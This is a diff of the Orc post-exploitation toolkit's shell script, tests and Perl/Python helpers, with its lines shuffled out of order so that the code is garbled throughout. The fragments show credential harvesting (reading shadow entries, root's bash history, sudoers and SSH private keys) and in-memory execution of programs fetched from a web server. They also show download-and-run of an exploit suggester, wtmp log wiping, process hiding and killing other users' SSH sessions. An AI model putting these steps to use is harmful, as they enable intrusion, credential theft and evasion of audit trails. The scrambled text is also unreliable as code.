@@ -1,0 +1,2285 @@
+    
+      
+        
+                
+                   One line per active interface
+                  or exit 1
+                break
+                signature = buffer[0:2]
+             $s = IO::Socket::INET->new(
+             $url = $ARGV[0]
+             close $s
+             print get $url
+            Destination directory (without file name).
+            Directory to archive.
+            First part of the version number
+            Second part of the version number
+            The netmask in dotted format
+            arguments feed through to the ssh
+            arguments feed through to the sudo
+            buffer = request.read(1048576)
+            if not buffer:
+            if not signature and len(buffer) > 1:
+            of numbers in the arguments is possible.
+            out.write(buffer)
+            processes as name of the program to start.
+           -exec stat -c '%a   %A      %U      %N' -- 
+           2> /dev/null
+           TCP port number
+           exit 1 
+           other arguments are passed through to the program/script
+           to defined a proxy for the download.
+          logs basename and command call in $OUTP/log.txt
+          pipes stderr into $OUTP/basename.err
+         1 if OS name is not equal
+         2 if OS name is equal but version is less.
+        RX packets 0  bytes 0 (0.0 B)
+        TTT=1
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        TX packets 3205  bytes 595218 (595.2 KB)
+        TX packets 784  bytes 63597 (63.5 KB)
+        chmod u
+        continue
+        echo 'SCTP enabled and withsctp callable'
+        echo 'SCTP enabled but withsctp is not callable'
+        else
+        ether 68:5d:43:b0:31:82  txqueuelen 1000  (Ethernet)
+        fi
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet 172.17.2.7  netmask 255.255.255.0  broadcast 172.17.2.255
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        inet6 fe80::8836:5635:53b7:5706  prefixlen 64  scopeid 0x20<link>
+        loop  txqueuelen 1000  (Local Loopback)
+        n_direct=$(( n_direct 
+        n_notfound=$(( n_notfound 
+        n_outside=$(( n_outside 
+        next }
+        next }'
+        os.system(anon 
+        print tmp
+        print tmp[2] }
+        print tmp[2] }'
+        raise RuntimeError('can not create anonymous file')
+        raise RuntimeError('does not support architecture ' 
+        raise RuntimeError('missing arguments: url and program name must be given')
+        request = urlopen(url)
+        while True:
+        }'
+       NF>1 
+       done
+       if(pts != exclude) print pts }')
+       tolower($0) 
+       while read -r addr mask
+      $ base64 -d FILE 
+      - bash
+      - dash
+      - mksh
+      - shellcheck
+      END {for(i in list) print list[i]}'
+      TTT=1
+      break
+      chmod 
+      continue
+      dist: bionic
+      dist: trusty
+      dist: xenial
+      done
+      echo '
+      echo ' permission denied'
+      echo ''
+      echo 'Error: call must getsfile [background]' >
+      echo 'Error: missing getcap' >
+      echo 'SCTP kernel module exists but is not loaded'
+      echo 'SCTP kernel module loaded'
+      echo 'SCTP sockets in use'
+      echo 'TCP sockets in use'
+      echo 'Warning: ignore HTTPS_PROXY value and use https_proxy value' >
+      echo 'Warning: ignore HTTP_PROXY value and use http_proxy value' >
+      echo 'files with capabilities
+      echo 'setuid flagged files list
+      else
+      error=$(orc_IP4toInteger $t 2>
+      fi
+      find / -perm /4000 
+      for find_result in $(find / -executable -type f $find_args 2> /dev/null)
+      getcap -r / 2>/dev/null
+      gsub( /[
+      gzip -d 
+      if orc_existsProg withsctp
+      n_total=$(( n_total 
+      orc_log2outp sellinux getenforce
+      orc_log2outp sellinux getsebool -a
+      orc_log2outp sellinux sestatus
+      printf ' readable'
+      printf ' searchable'
+      printf ' writeable'
+      return
+      return 1
+      return 2
+      }
+     $7 in shells {print $1}' /etc/shells -
+     NF==1 
+     done
+     getsctp - check if the box has support for SCTP
+     while read -r addr bits
+     }' 
+    'sparc64': 348
+    ( base64 -d 
+    ) << ====end
+    - os: linux
+    But the name must be given in each case to use the same
+    ENV=${BASH_SOURCE[0]}
+    HTTPS_PROXY=$https_proxy
+    HTTP_PROXY=$http_proxy
+    NOT_THIS=$(orc_ourPts)
+    PTS_LIST=$(ps -eo args 
+    PYTHONHTTPSVERIFY=0 python -c '
+    SSHD_PID=$(pgrep -a sshd 
+    TTT=0
+    The load could fail if the user can not load kernel modules
+    The name is only used to start the program.
+    anon = '/proc/' 
+    arguments = sys.argv[3:]
+    arp -na 
+    assertEquals 'returned false' 0 $
+    awk '
+    chmod 
+    command line format.
+    counter=$(( counter - 1 ))
+    dig 
+    do
+    done
+    echo '' 
+    echo '(used dig)'
+    echo '(used host)'
+    echo '/dev/shm'
+    echo '/root'
+    echo '/tmp'
+    echo '/var/tmp'
+    echo 'ERROR: memexec.pl is not included' >
+    echo 'ERROR: memexec.py is not included' >
+    echo 'Error: Can not list ARP content. Found no tool' >
+    echo 'Error: HOME variable is empty' >
+    echo 'Error: IPv4 address must be given as argument' >
+    echo 'Error: You have got a tty. You can not use qssh' >
+    echo 'Error: address and netmask must be given' >
+    echo 'Error: archiver needs two arguments' >
+    echo 'Error: argument must be one URL to load' >
+    echo 'Error: argument user-id must be given' >
+    echo 'Error: bash needed but not found' >
+    echo 'Error: can not create echo file' >
+    echo 'Error: can not list broadcast addresses. Found no tool' >
+    echo 'Error: fixed length size must be given' >
+    echo 'Error: fpssh needs host name as argument' >
+    echo 'Error: hangup functions needs argument: ID number of PTS' >
+    echo 'Error: length out of range' >
+    echo 'Error: memexec needs URL as argument' >
+    echo 'Error: missing basename of the output files' >
+    echo 'Error: missing command to execute' >
+    echo 'Error: missing host name' >
+    echo 'Error: missing program name to check' >
+    echo 'Error: missing text to echo' >
+    echo 'Error: need host and TCP port as arguments' >
+    echo 'Error: need two arguments: file and destination' >
+    echo 'Error: no IPv4 address given' >
+    echo 'Error: no download tool found' >
+    echo 'Error: no tool to open TCP connection found' >
+    echo 'Error: no working archive tool found' >
+    echo 'Error: number must given as argument' >
+    echo 'Error: output directory not defined or prepared' >
+    echo 'Error: portscan needs one host name or host address' >
+    echo 'Error: psgrep needs grep pattern as argument'
+    echo 'Error: qssh needs at least password and command as arguments' >
+    echo 'Error: qsu needs at least password and command as arguments' >
+    echo 'Error: srm needs a file name(s) as argument' >
+    echo 'Error: wiper needs grep pattern as argument' >
+    echo 'need address and netmask as arguments' >
+    else
+    else:
+    errorFlag=1
+    fi
+    for file do
+    from urllib.request import urlopen
+    from urllib2 import urlopen
+    host -W 3 -t txt o-o.myaddr.l.google.com ns1.google.com 
+    http_proxy=$HTTP_PROXY
+    https_proxy=$HTTPS_PROXY
+    if [ $
+    if [ $TTT -eq 0 ]
+    if checksctp 2>
+    if fd == 1:
+    if grep -qi '
+    if len(sys.argv) < 3:
+    if netstat -a --sctp 2> /dev/null 
+    if orc_existsProg find
+    if orc_existsProg getcap
+    if orc_existsProg getsebool
+    if platform.machine() not in sys_call_numbers.keys():
+    if platform.system() != 'Linux':
+    if signature and signature[0] in (ord('
+    ifconfig 
+    interpreter='fallback'
+    interpreter='perl'
+    interpreter='python'
+    interpreter='python2'
+    interpreter='python3'
+    ip addr show 
+    ip neigh show 
+    n_direct=0
+    n_notfound=0
+    n_outside=0
+    n_total=0
+    name = sys.argv[2]
+    or the module does not exists.
+    orc_local cmd_name find_args find_result
+    orc_local n_total n_direct n_outside n_notfound
+    orc_log2outp crontab cat /etc/crontab
+    orc_log2outp ifconfig ifconfig -a
+    orc_log2outp ifconfig ip link
+    orc_log2outp iptables iptables -L
+    orc_log2outp netstat netstat -peanut
+    orc_log2outp root_dir ls -al /root/
+    orc_log2outp roothist cat /root/.bash_history
+    orc_log2outp secure cat /var/log/secure
+    orc_log2outp shadow getent shadow
+    orc_log2outp ssh_keys find /home/ -name id_rsa
+    orc_log2outp sshd_config cat /etc/ssh/sshd_config
+    orc_log2outp sudoers cat /etc/sudoers
+    packages:
+    perl -e 'use IO::Socket
+    perl -e 'use LWP::Simple qw ($ua head get)
+    print(error)
+    return 0
+    return 1
+    return 2
+    return 9
+    sctp support but not installed checksctp tool is possible.
+    shift
+    signature = None
+    sleep 2
+    sys.exit(1)
+    sys_call_nr = sys_call_numbers[platform.machine()]
+    url = sys.argv[1]
+    value=$(( (value >> 1) 
+    value=$(( value 
+    while read -r cmd_name
+   Ubuntu 18.04 (Bionic Beaver) 
+   Ubuntu Trusty 14.04
+   Ubuntu Xenial 16.04
+   and empty lines.
+   included into the o.rc script.
+  $libcv
+  $syscallnr = 1340 }
+  $syscallnr = 319 }
+  $syscallnr = 348 }
+  $syscallnr = 356 }
+  $syscallnr = 360 }
+  $syscallnr = 385 }
+  - shellcheck -s bash o.rc
+  - shellcheck -s dash o.rc
+  - shellcheck -s ksh o.rc
+  - shellcheck -s sh o.rc
+  - shellcheck resources/
+  - shellcheck tests/
+  - tests/scripts_included.sh
+  - tests/start_shunit2.sh bash
+  - tests/start_shunit2.sh dash
+  - tests/start_shunit2.sh ksh
+  . ./o.rc > /dev/null
+  C test program for the memexec funtion.
+  HTTPS_PROXY=''
+  HTTPS_PROXY='https2-test'
+  HTTP_PROXY=''
+  HTTP_PROXY='http2-test'
+  LONGARG=$(ps --no-header -wweo cmd 
+  OUTP=$HOME/files/
+  Python 2 and Python 3 interpreters can run this code.
+  Shell script to encode a Perl script.
+  Shell script to encode a Python script.
+  Test shell script for the memexec function.
+  The Perl version of the memexec function.
+  The Python version of the memexec function.
+  The memexec function should be able to start the compiled program.
+  The memexec function should be able to start this script.
+  The program must be compiled for the desired target system before
+  address=${address
+  address=${address%
+  alias orc_existsTestCommand='hash'
+  alias orc_existsTestCommand='type'
+  alias orc_local='local'
+  alias orc_local='orc_noop'
+  alias orc_local='typeset'
+  apt:
+  assertEquals 'returned false (1)' 0 $
+  assertEquals 'returned false (2)' 0 $
+  assertEquals 'returned false (3)' 0 $
+  assertEquals 'returned false (4)' 0 $
+  assertEquals 'returned false (5)' 0 $
+  assertEquals 'returned false (6)' 0 $
+  assertEquals 'returned false' 0 $
+  assertEquals 'returned falsei (2)' 0 $
+  assertNotEquals 'returned not false (3)' 0 $
+  assertNotEquals 'returned not false (4)' 0 $
+  assertNotEquals 'returned not false' 0 $
+  awk '
+  awk '(NF==1 
+  awk 'NF==1 {users[$1]=1}
+  awk -F ':' '
+  awk -F ':' 'hit[$6] == 0 {hit[$6]=1
+  awk -F= 'toupper($1)
+  base64 -d << ====end
+  basename=$1
+  case $1 in
+  chmod 222 _test_source/f2
+  chmod 700 _test_source/f3
+  correctoutput='127.0.0.1
+  counter=$1
+  dbus-daemon --version 
+  do
+  done
+  echo $(( ($1 
+  echo $value
+  echo '
+  echo ''
+  echo 'Attempting to get IP...'
+  echo 'Broadcast ping is done.'
+  echo 'Can not download shunit2 testframework' >
+  echo 'Doing some basic listing of the usual suspects...'
+  echo 'ERROR: encode_perl_script memexec failed' >
+  echo 'ERROR: encode_python_script memexec failed' >
+  echo 'ERROR: no http/https addresses found' >
+  echo 'Error: ENV not defined. Can not start script' >
+  echo 'Error: can not find a home directory' >
+  echo 'Error: can not find a tool for program exist checks' >
+  echo 'Error: missing the shunit2 script' >
+  echo 'Get current shunit2 framework from github'
+  echo 'IPv4 and IPv6 addresses in the ARP table:'
+  echo 'Pinging broadcast.'
+  echo 'Please wait...'
+  echo 'The echo_function'
+  echo 'This is seriously rude...'
+  echo 'Typical directories for tmp files:'
+  echo 'Use existing shunit2 framework'
+  echo 'Warning: backup variable with script file is not available' >
+  echo 'collect all readable .ssh/known_hosts files'
+  echo 'coredumps disabled by limit'
+  echo 'coredumps disabled by ulimit'
+  echo 'missing the o.rc script in the cwd' >
+  echo 'try /etc/hosts'
+  echo 'try /etc/lmhosts'
+  echo 'try /etc/ssh/known_hosts file'
+  elif ! orc_existsProg gzip
+  elif ! orc_isMinimalOsVersion Linux 3 17
+  elif orc_existsProg ip
+  elif orc_existsProg nc
+  elif orc_existsProg netstat
+  elif orc_existsProg nmap
+  elif orc_existsProg perl
+  elif orc_existsProg python
+  elif orc_existsProg python2
+  elif orc_existsProg python3
+  elif orc_existsProg wget
+  elif orc_existsProg wipe
+  else
+  encoded=$(cat resources/memexec.pl.base64)
+  encoded=$(cat resources/memexec.py.base64)
+  error=$(cat 'testA.err')
+  error=$(dropsuid 2>
+  error=$(echo_function 2>
+  error=$(getdbus 2>
+  error=$(getdocker 2>
+  error=$(getenum 2>
+  error=$(getescape 2>
+  error=$(getexploit 2>
+  error=$(getgtfobins 2>
+  error=$(gethelp 2>
+  error=$(getidle 2>
+  error=$(getinfo 2>
+  error=$(getip 2>
+  error=$(getjail 2>
+  error=$(getluks 2>
+  error=$(getnet 2>
+  error=$(getrel 2>
+  error=$(getsctp 2>
+  error=$(getsec 2>
+  error=$(getsfiles 2>
+  error=$(getsfiles background 2>
+  error=$(getspec 2>
+  error=$(gettmp 2>
+  error=$(getusers 2>
+  error=$(getuservices 2>
+  error=$(orc_homeOfCurrentUser 2>
+  error=$(orc_inetAddressAndMask 2>
+  error=$(orc_listArp 2>
+  error=$(orc_listBroadcastAddress 2>
+  error=$(orc_listHomes 2>
+  error=$(orc_listTmp 2>
+  error=$(orc_listUsers 2>
+  error=$(orc_loadURL https://raw.githubusercontent.com/zMarch/Orc/master/resources/echo_arguments.sh 2>
+  error=$(orc_noop 2>
+  error=$(orc_ourPts 2>
+  error=$(portscan localhost 2>
+  error=$(prochide 2>
+  error=$(srm test_file1_for_srm test_file2_for_srm 2>
+  error=$(srm test_file_for_srm 2>
+  error=$(tools 2>
+  errorFlag=1
+  esac
+  exit 1
+  export HTTPS_PROXY
+  export HTTP_PROXY
+  export http_proxy
+  export https_proxy
+  export our_pty
+  fi
+  first=${rest%%.
+  for PTS_ID in $PTS_LIST
+  for addr in $(orc_listBroadcastAddress)
+  for arg
+  for base in $(orc_listTmp)
+  for dir in $(orc_listHomes)
+  for i in $(orc_listTmp)
+  for n in 0 1 7 2 21 24 32 128 200 255
+  for port in  21 22 23 80 443 8080 8443 129 445 3389 3306
+  for userid in 0 1 $(id -u)
+  for( i = 0
+  getent passwd 
+  git clone --quiet --no-tags --single-branch --depth 1 https://github.com/kward/shunit2.git
+  http_proxy=''
+  http_proxy='http-test'
+  https_proxy=''
+  https_proxy='https-test'
+  if ! orc_existsProg base64
+  if ! orc_existsProg bash
+  if ! orc_existsProg ssh-keyscan
+  if ! orc_existsProg type
+  if [ $
+  if modinfo sctp > /dev/null 2>
+  if orc_existsProg arp
+  if orc_existsProg bash
+  if orc_existsProg checksctp
+  if orc_existsProg curl
+  if orc_existsProg dig
+  if orc_existsProg ifconfig
+  if orc_existsProg shred
+  if orc_existsProg ss
+  if orc_existsProg tar
+  if tty 
+  include:
+  int i
+  limit coredumpsize 0
+  memexec can start the binary file.
+  mkdir $HOME 2>/dev/null
+  mkdir _test_destination
+  mkdir _test_source
+  modprobe sctp > /dev/null 2>
+  mypts=${mytty
+  mytty=$(tty)
+  old perl interpreters.
+  orc_collectOtherHostsInfo
+  orc_colorNever=''
+  orc_colorNever='--color=never'
+  orc_createEchoFile argument_A argument_BB
+  orc_exportProxySettings
+  orc_httpsProxyReminder raw.githubusercontent.com
+  orc_inetAddressAndMask 
+  orc_integerToIP4 $value
+  orc_listArp
+  orc_listUsers
+  orc_loadURL 'https://gtfobins.github.io/' 
+  orc_loadURL 'https://raw.githubusercontent.com/bcoles/linux-exploit-suggester/master/linux-exploit-suggester.sh' 
+  orc_loadURL 'https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh' 
+  orc_loadURL 'https://whatismyip.akamai.com'
+  orc_local addr
+  orc_local addr mask
+  orc_local dir
+  orc_local first rest
+  orc_local myaddr mask value lastvalue address
+  orc_local str value
+  orc_local url interpreter
+  orc_local value counter topbit
+  orc_log2outp cpuinfo cat /proc/cpuinfo
+  orc_log2outp date date
+  orc_log2outp df df
+  orc_log2outp free free -g
+  orc_log2outp hosts cat /etc/hosts
+  orc_log2outp id id
+  orc_log2outp last last -i
+  orc_log2outp lsmod lsmod
+  orc_log2outp lsusb lsusb
+  orc_log2outp mount mount
+  orc_log2outp netstat netstat -peanut
+  orc_log2outp passwd getent passwd
+  orc_log2outp ps ps -weFH
+  orc_log2outp resolve cat /etc/resolv.conf
+  orc_log2outp route route -n
+  orc_log2outp rpcinfo rpcinfo
+  orc_log2outp testA pwd
+  orc_log2outp uname uname -a
+  orc_log2outp uptime uptime
+  orc_log2outp user_crontab crontab -l
+  orc_log2outp w w
+  orc_pingBroadcast
+  our_pty=$(orc_ourPts)
+  output=$(cat 'testA.txt')
+  output=$(echo 'test' 
+  output=$(echo_function argument_1 argument_2)
+  output=$(getgtfobins 2> /dev/null)
+  output=$(gethelp 2> /dev/null)
+  output=$(getsfiles 2> /dev/null)
+  output=$(orc_IP4toInteger 0.0.0.1 2>
+  output=$(orc_IP4toInteger 0.0.1.1 2>
+  output=$(orc_IP4toInteger 0.1.1.1 2>
+  output=$(orc_IP4toInteger 1.1.1.1 2>
+  output=$(orc_createEchoFile argument_A argument_BB 2>
+  output=$(orc_existsProg ' this is not a program ' 2>
+  output=$(orc_existsProg orc_noop 2>
+  output=$(orc_exportProxySettings 2>
+  output=$(orc_homeOfCurrentUser)
+  output=$(orc_inetAddressAndMask)
+  output=$(orc_integerToIP4 1 2>
+  output=$(orc_integerToIP4 16843009 2>
+  output=$(orc_integerToIP4 257 2>
+  output=$(orc_integerToIP4 65793 2>
+  output=$(orc_isMinimalOsVersion Linux 1 0 2>
+  output=$(orc_isMinimalOsVersion Linux 1 120 2>
+  output=$(orc_isMinimalOsVersion Linux 123 0 2>
+  output=$(orc_isMinimalOsVersion ThisIsNotAnOsName 1 0 2>
+  output=$(orc_lengthToIP4netmask 1 2>
+  output=$(orc_lengthToIP4netmask 20 2>
+  output=$(orc_lengthToIP4netmask 24 2>
+  output=$(orc_lengthToIP4netmask 26 2>
+  output=$(orc_listArp)
+  output=$(orc_listBroadcastAddress)
+  output=$(orc_listHomes)
+  output=$(orc_listTmp)
+  output=$(orc_listUsers)
+  output=$(orc_loadURL https://raw.githubusercontent.com/zMarch/Orc/master/resources/echo_arguments.sh)
+  output=$(orc_log2outp testA ' this is not a program name ' 2>
+  output=$(orc_makeHome 2>
+  output=$(orc_noop)
+  output=$(orc_ourPts)
+  output=$(orc_testAndCopy _test_source/f1 _test_destination 2>
+  output=$(orc_testAndCopy _test_source/f2 _test_destination 2>
+  output=$(orc_testAndCopy _test_source/f3 _test_destination 2>
+  output=$(orc_testAndCopy _test_source/ff _test_destination 2>
+  output=$(orc_tryTcpConnection 'raw.githubusercontent.com' 43 2>
+  output=$(orc_tryTcpConnection 'raw.githubusercontent.com' 80 2>
+  output=$(sourceurl https://raw.githubusercontent.com/zMarch/Orc/master/resources/echo_function.sh 2>
+  printf 'DNS says: '
+  printf 'HTTP says: '
+  printf 'Init system is: '
+  printf 'Kernel: '
+  printf 'dbus: '
+  printf 'glibc: '
+  ps --no-header aux 
+  ps -weFH 
+  rest=$(uname -r)
+  rest=${rest
+  return
+  return 0
+  return 1
+  return argc-2
+  rm -f 'testA.err'
+  rm -f sfiles
+  rm -fr _test_destination
+  rm -fr _test_source
+  shift
+  sourceurl https://raw.githubusercontent.com/zMarch/Orc/master/resources/echo_function.sh
+  stat /dev/pts/
+  sys.exit(1)
+  testinput='
+  then
+  topbit=$(( 1 << 31 ))
+  type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump
+  ulimit -c 0
+  uname -rv
+  utmpdump /var/log/wtmp 
+  value=$(( $1 >> 8 ))
+  value=$(( (value << 8) 
+  value=$(( value >> 8 ))
+  value=${1%.
+  value=0
+  while read -r dir
+  while read -r i
+  while read -r t
+  while true
+  { df -P
+  { orc_listUsers
+  } 
+ !($1 in users) {print}'
+ $1 !
+ $2) 
+ ${str%.
+ '/fd/' 
+ 'flat name' of the source. This means the full path given
+ 'orc_local var=value' because the second form is not supported by
+ ((65535<<16
+ (See function orc_flatFileName.)
+ (possible way: replace ping with a function named ping
+ - Compress the striped file with gzip
+ - Downloads the shunit2 test framework
+ - Removes all comment lines (including 
+ - Removes use strict and use warnings.
+ - Starts the test script with o.rc
+ - The current scripts in the resources sub-directory must be
+ - The used quoated http and https addresses must be accessable.
+ - base64 encode the compressed file
+ --color=never the colored output is switched of. Old grep
+ -c '%n %X %U' 
+ -eq 1 ] 
+ -lt 1 ]
+ -lt 2 ]
+ -ne 0 ]
+ -ne 1 ]
+ -ne 2 ]
+ -ne 3 ]
+ /(arm
+ /(sparc
+ /i386-linux/) {
+ /ia64-linux/) {
+ /power(pc
+ /proc/self process memory.
+ /sshd.
+ /x86_64-linux/) {
+ 1 ))
+ 1) Try to load the sctp kernel module
+ 1) URL to load the binary program or script file..
+ 1st Argument of the script is the URL to load
+ 2) Info about the stp kernel info
+ 2nd Argument is the program name to use
+ 3) Info about sctp command line tools.
+ 3) optional: arguments passed thru to the program.
+ 4) Info about listening and non-listening sockets.
+ 65535<<16
+ A binary program must be compiled for the architecture of
+ A check for a program or shell command could be executed
+ A proxy could be set via environment variables to the tools.
+ A variable instead an alias does not work with ksh.
+ ARGUMENTS are the arguments used by the Perl script.
+ ARGUMENTS are the arguments used by the Python script.
+ Activate colored output
+ All available Linux distributions with language minimal:
+ All bits 1 outside the netmask is the broadcast address
+ Also possible to reuse an existing directory
+ Archive a directory content in a file.
+ Argument fixed length
+ Argument: -
+ Argument: A file name with path.
+ Argument: ID of the user.
+ Argument: IPv4 address
+ Argument: Name or IP address of the server.
+ Argument: Name or IP of the target box.
+ Argument: None.
+ Argument: Program/command name to check.
+ Argument: Text to echo.
+ Argument: file(s) to overwrite and to remove.
+ Argument: grep pattern to remove
+ Argument: host name or host IP address
+ Argument: integer number
+ Argument: search pattern.
+ Argument: the shell to use.
+ Arguments : none
+ Arguments: Base name of the archive file.
+ Arguments: File to copy (could contain a path).
+ Arguments: None
+ Arguments: OS name (e.g. Linux)
+ Arguments: One IPv4 address in dotted format
+ Arguments: none
+ Arguments: password
+ Arguments: program to execute with optional arguments.
+ Attention: ifconfig output is different on the systems.
+ Build Status
+ But some tools in some versions needs lower case and some
+ C program to test the memexec script.
+ Call memfd_create function via his 64-bit Linux system call number 319
+ Can not load the program/script into anonymous file.
+ Check EUID of /root works in dash (and in bash).
+ Check for common tools.
+ Check if it is a pts device
+ Check the alias orc_existsTestCommand
+ Check the included http and https expressions.
+ Checks if a program/command exists.
+ Checks only the single-quated expression. Other strings could
+ Checks the OS name and version.
+ Checks the helper scripts in resources
+ Checks the helper scripts in tests
+ Collect files containing info about other hosts.
+ Collect output files in $OUTP
+ Compatibility Layer 
+ Convert to absolute file name for later use.
+ Converts a IPv4 address into a number.
+ Converts a number into an IPv4 address
+ Converts the fixed length number into the IPv4 bitmask.
+ Copies the file into the destination directory with the
+ Copy URL content to the anonymous file
+ Copy data from server to anonymous file
+ Counting with a pipe into a while read loop is complicated.
+ Create an anonymous file with name '' and close-on-exec (=1) flag
+ Create home directory and prepare remove at script exit
+ Create the script file in the prepared HOME directory
+ Creates a copy of this script in variable backup
+ Creates a home directory.
+ Creates a shell script file which echos the arguments.
+ Do not insert the code because python is insert sensitive.
+ Do not use option -N here because not all nc implementations support
+ Download and run linux-exploit-suggester.
+ Download the shunit2 test framework
+ END {print X}')
+ Ethernet addresses do not pass.
+ Execute a binary program
+ Execute a binary program or a script file in-memory from web-server.
+ Execute a program hidden by a long program name.
+ Execute a script
+ Execute a script.
+ Execute the binary program
+ Execute the program or the script without touching the
+ Exit status: 0 if one ore more programs do not exists.
+ Export http and https proxy settings in some formats.
+ Figure out: Is it a binary file or script file
+ File signature is the first two bytes:w
+ Filters strings look like an IPv4 or IPv6 address.
+ Find the system call number of memfd_create on the current machine
+ First IPv4 address in a LAN.
+ Functions
+ Functions outside the compatibility layer call functions in this
+ Get our PTS.
+ Gets the home directory of the current user.
+ Gets the home directory of the user.
+ Global:   http_proxy and https_proxy variables could be used
+ Global: http(s)_proxy variables will be used.
+ Global: https_proxy variable is checked.
+ Global: set $ORC_ECHO_FILE to the created file.
+ Globals   : our_pty could contain the number of our PTY
+ Globals:   Set ORC_ARCHIV_FILE to the name of the created file.
+ Helper Functions 
+ Here the alias orc_local is defined to ensure a wide support.
+ If this is not possible the file is stored in the $HOME
+ Import user agent ($ua) and get to file function.
+ In the compatibility layer the functions to handle the differences
+ In the section of the internal helper functions are collected.
+ In-Memory-Only ELF Execution (Without tmpfs)
+ Last IPv4 address in a LAN.
+ Limit access to the owner
+ List IP addresses in the ARP table.
+ List all ptys and their idle times accurately.
+ List only resolved addresses.
+ List ports which allow TCP connections.
+ List setuid flagged files
+ List the broadcast addresses of interfaces.
+ List the home directories of the users.
+ List tmpfs directories with access information.
+ Listing users in passwd with login shells.
+ Lists files with setuid and setcap.
+ Lists the IPv4 addresses and netmask of the interfaces.
+ Load binary program or script file from web server.
+ Loads the orc at test setup
+ Maximal one address per line will pass the filter.
+ Method   : use the longest command line of the current running
+ Method: Creates a shell script file which echoes the password.
+ Multiarch Architecture Specifiers
+ NOTES
+ Needs Linux kernel >= 3.17
+ Needs write access to the wtmp file. Typical only root
+ No check of the SSL certifacte
+ No operation.
+ Now no archive file exists. Reset any old content.
+ On systems (e.g. busybox) the call failed but the test pass
+ One address = one word per line
+ One address plus mask per line = two words per line
+ One text line will be written to stderr.
+ One user per line = one word per line
+ Open a connection with the bash.
+ Open connection with netcat
+ Optional argument background
+ Orc Resources
+ Orc Tests
+ Orc is a simple post-exploitation written in bash.
+ Output    : prints info to stdout
+ Output to $HOME/kh archive file
+ Output to stdout
+ Output to stdout: Address and mask space separated.
+ Output to stdout: IPv4 address in dotted format.
+ Output to stdout: IPv4 bitmask
+ Output to stdout: One home directory per line.
+ Output to stdout: Reminder.
+ Output to stdout: The content of the URL document.
+ Output to stdout: The name with slashes replaced by underlines.
+ Output to stdout: first address in the LAN as integer
+ Output to stdout: home directory
+ Output to stdout: integer number
+ Output to stdout: last address in the LAN as integer
+ Overwriting data through the file system does not work on all
+ Path to the resources files
+ Ping all local IPv4 addresses
+ Ping the Broadcast IP addresses of all interfaces.
+ Print info about sctp connection support on the box.
+ Prints report to stdout
+ Prints the OS name from the release file.
+ Pulls down the list of current gtfobins and checks to see
+ Pulls my suspect tool from github.
+ Reject shells named 
+ Remind the user if https_proxy is not set and
+ Remove the single files. Keep only the archive file.
+ Remove the single log files. Keep only the archive file.
+ Removes entries from wtmp
+ Return:    0 if and only if archive file creation was ok.
+ Return: 0 if OS name is equal and version is equal or greater.
+ Return: 0 if and only if TCP connection could be opened
+ Run a portscan against common ports
+ Run the defined shell test scripts
+ Run the defined shunit2 test scripts
+ Run the tests
+ Run with Travis CI raises the error:
+ Runs a command and writes output to files in $OUTP.
+ Script Start
+ Script arguments:
+ Script runs in bash. Here BASH_SOURCE exists.
+ Script was started in bash via source.
+ Search in the list of tmpfs filesystem and in a list of common
+ Searchs a temporary directory without noexec flag as base. 
+ Sets the variable $HOME to this new created directory.
+ Shell script to test the memexec script.
+ Shell script to test the sourceurl function.
+ Simple Perl script obfuscation.
+ Simple Pyhon script obfuscation.
+ So select the PID with the AWK tool
+ So the shellcheck 2086 must be disabled.
+ So the shellcheck 2154 must be disabled.
+ So try to figure out which command works and define an
+ Some missing tools are normal. So $error could be contain messages
+ Some modern grep tools uses colored output. With the switch
+ Some user level functions uses the functions and variables defined
+ Some valid IPv6 are do not pass the filter.
+ Source a downloaded script.
+ Starts a test with the shunit2 test framework.
+ Static code check with shellcheck tool
+ Stores all single files in one archive file.
+ Stores all single log files in one archive file.
+ Stores the downloaded file in an anonymous file in the
+ Stores the file in the process memory /proc/id.
+ System call number of memfd_create depends on the machine
+ System call table
+ TCP connect scan with nmap
+ TCP connection open with python version 2
+ TODO: add more checks
+ TODO: add test of funtcion orc_pingBroadcast
+ TODO: add test of orc_archive
+ TODO: add test of orc_collectOtherHostsInfo
+ TODO: add test of orc_httpsProxyReminder
+ TODO: make a more specific grep with pgrep.
+ Terminate someones PTS by killing their SSH process.
+ Test read access. Then copy if read access is possible.
+ Test the dropsuid function
+ Test the getdbus function
+ Test the getdocker function
+ Test the getenum function
+ Test the getescape function
+ Test the getexploit function
+ Test the getgtfobins function
+ Test the gethelp function
+ Test the getidle function
+ Test the getinfo function
+ Test the getip function
+ Test the getjail function
+ Test the getluks function
+ Test the getnet function
+ Test the getrel function
+ Test the getsctp function
+ Test the getsec function
+ Test the getsfiles function
+ Test the getspec function
+ Test the gettmp function
+ Test the getusers function
+ Test the getuservices function
+ Test the orc_colorNever flag for the grep tool
+ Test the orc_createEchoFile function
+ Test the orc_existsProg function
+ Test the orc_exportProxySettings function
+ Test the orc_filterIpAddress function
+ Test the orc_flatFileName function
+ Test the orc_homeOfCurrentUser function
+ Test the orc_homeOfUserID function
+ Test the orc_inetAddressAndMask function
+ Test the orc_isMinimalOsVersion function
+ Test the orc_listArp function
+ Test the orc_listBroadcastAddress function
+ Test the orc_listHomes function
+ Test the orc_listTmp function
+ Test the orc_listUsers function
+ Test the orc_loadURL function
+ Test the orc_log2outp function
+ Test the orc_makeHome function
+ Test the orc_noop function
+ Test the orc_ourPts function
+ Test the orc_testAndCopy function.
+ Test the orc_tryTcpConnection function
+ Test the portscan function
+ Test the prochide function
+ Test the sourceurl function
+ Test the srm function
+ Test the tools function
+ Tests
+ Tests of the internal functions are collecte here.
+ Tests of the user level functions are collecte here.
+ Tests the orc_IP4toInteger function.
+ Tests the orc_firstIP4integer function
+ Tests the orc_integerToIP4 function.
+ Tests the orc_lengthToIP4netmask function
+ Tests with shunit2 test framework.
+ The C program can be compiled to a binary program
+ The C program writes the command line arguments to stdout.
+ The HTML source of the GTFOBins page is generated. So the structure of the
+ The Project
+ The Python scrips runs with Python version 3 and 2
+ The Python script could be executed by
+ The call before loads the script only in a subshell. Now load the script in the
+ The call number depends on the architecture. A table archname - number
+ The condition should work with POSIX sh and bash.
+ The error flag will be set to 1 if an test fail
+ The exit code of the script is number of arguments.
+ The file defines one function.
+ The filter passes all valid IPv4 addresses.
+ The find_args are not quoted because it must be splitted.
+ The function copies only if a read access is possible.
+ The function reads stdin and writes to stdout.
